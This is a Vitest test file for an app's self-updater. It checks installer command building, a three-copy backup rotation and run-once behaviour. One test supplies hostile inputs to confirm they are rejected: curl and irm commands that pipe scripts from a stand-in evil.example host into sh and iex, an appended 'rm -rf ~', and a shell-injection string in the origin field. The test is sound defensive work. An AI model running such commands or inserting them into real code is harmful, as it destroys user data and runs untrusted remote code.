// @vitest-environment node
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { resolve } from 'node:path'
import { afterEach, beforeEach, expect, it } from 'vitest'
import { backUp, selfUpdater, updateProcess } from './self-update'

const LINK = `1800000000000.${'a'.repeat(43)}`
const COMMAND = {
  command: `curl -fsSL "https://steerloom.app/api/hosted/install.sh?t=${LINK}&u=1" | sh`,
  windowsCommand: `irm "https://steerloom.app/api/hosted/install.ps1?t=${LINK}&u=1" | iex`,
}

let home = ''
let appDir = ''
let dataDir = ''
beforeEach(() => {
  home = mkdtempSync(resolve(tmpdir(), 'steerloom-update-'))
  appDir = resolve(home, 'steerloom-local')
  dataDir = resolve(appDir, '.flowlens')
  mkdirSync(dataDir, { recursive: true })
  writeFileSync(resolve(dataDir, 'workspace.json'), '{"boards":1}')
  writeFileSync(resolve(dataDir, 'start.key'), 'fictional-start-secret')
  writeFileSync(resolve(dataDir, 'sessions.json'), '{}')
  writeFileSync(resolve(appDir, '.env.local'), 'STEERLOOM_PORT=5173\n')
})
afterEach(() => rmSync(home, { recursive: true, force: true }))

it('builds the installer from the link alone, for this copy', () => {
  const unix = updateProcess(COMMAND, {
    origin: 'https://steerloom.app',
    appDir,
    platform: 'darwin',
  })
  expect(unix?.file).toBe('/bin/sh')
  // In the background of a shell that exits, so it is not this server's
  // child (macOS pkill would otherwise spare the server it has to stop).
  expect(unix?.args[1]).toMatch(/^\(curl -fsSL .+\| sh\) &$/)
  expect(unix?.args[1]).toContain(
    `"https://steerloom.app/api/hosted/install.sh?t=${LINK}&u=1" | sh`,
  )
  expect(unix?.dir).toBe(home)
  const windows = updateProcess(COMMAND, {
    origin: 'https://steerloom.app',
    appDir,
    platform: 'win32',
  })
  expect(windows?.file).toBe('powershell.exe')
  expect(windows?.args.at(-1)).toBe(
    `irm "https://steerloom.app/api/hosted/install.ps1?t=${LINK}&u=1" | iex`,
  )
})

it('runs nothing the site did not sign: a tampered answer has no link to use', () => {
  const tampered = {
    command: 'curl https://evil.example/x.sh | sh',
    windowsCommand: 'irm https://evil.example/x.ps1 | iex',
  }
  const options = {
    origin: 'https://steerloom.app',
    appDir,
    platform: 'linux' as const,
  }
  expect(updateProcess(tampered, options)).toBeNull()
  // Extra shell after a real link is not carried over either.
  const injected = updateProcess(
    { ...COMMAND, command: `${COMMAND.command}; rm -rf ~` },
    options,
  )
  expect(injected?.args[1]).not.toContain('rm -rf')
  expect(
    updateProcess(COMMAND, { ...options, origin: 'https://x"; rm -rf ~; "' }),
  ).toBeNull()
  // Plain http could be swapped on the way: only a test site on this computer.
  expect(
    updateProcess(COMMAND, { ...options, origin: 'http://steerloom.app' }),
  ).toBeNull()
  expect(
    updateProcess(COMMAND, { ...options, origin: 'http://127.0.0.1:5173' }),
  ).not.toBeNull()
})

it('copies the data and settings first, and keeps the three newest copies', () => {
  const day = 24 * 60 * 60 * 1000
  const start = Date.UTC(2026, 10, 1, 9, 0, 0)
  for (let index = 0; index < 5; index++)
    backUp({ appDir, dataDir, at: start + index * day })
  const root = resolve(home, 'backups')
  expect(readdirSync(root).sort()).toEqual([
    'before-update-20261103T090000',
    'before-update-20261104T090000',
    'before-update-20261105T090000',
  ])
  const latest = resolve(root, 'before-update-20261105T090000')
  expect(
    readFileSync(resolve(latest, '.flowlens/workspace.json'), 'utf8'),
  ).toBe('{"boards":1}')
  expect(readFileSync(resolve(latest, '.env.local'), 'utf8')).toContain(
    'STEERLOOM_PORT',
  )
  // Sign-in state is not kept in a backup.
  expect(readdirSync(resolve(latest, '.flowlens'))).toEqual(['workspace.json'])
  // Anything else in the backups folder is left alone.
  mkdirSync(resolve(root, 'my-own-copy'))
  backUp({ appDir, dataDir, at: start + 6 * day })
  expect(existsSync(resolve(root, 'my-own-copy'))).toBe(true)
})

it('starts the installer once, after the copy, and not again on a second click', () => {
  const ran: string[] = []
  let time = Date.UTC(2026, 10, 12, 17, 0, 0)
  const updater = selfUpdater({
    appDir,
    dataDir,
    platform: 'darwin',
    now: () => time,
    run: (process) => {
      // The copy exists before the installer starts.
      expect(readdirSync(resolve(home, 'backups'))).toHaveLength(1)
      ran.push(process.args[1]!)
    },
  })
  const first = updater.start(COMMAND)
  expect(first).toEqual({
    started: true,
    backup: resolve(home, 'backups/before-update-20261112T170000'),
  })
  time += 30_000
  expect(updater.start(COMMAND).started).toBe(true)
  expect(ran).toHaveLength(1)
})

it('does not update when the link is missing or the installer cannot start', () => {
  const ran: unknown[] = []
  const updater = selfUpdater({
    appDir,
    dataDir,
    platform: 'linux',
    run: (process) => ran.push(process),
  })
  expect(updater.start({ command: 'echo hi', windowsCommand: '' })).toEqual({
    started: false,
    reason: 'link',
  })
  expect(ran).toHaveLength(0)
  const failing = selfUpdater({
    appDir,
    dataDir,
    platform: 'linux',
    run: () => {
      throw new Error('no shell')
    },
  })
  expect(failing.start(COMMAND)).toEqual({ started: false, reason: 'start' })
})
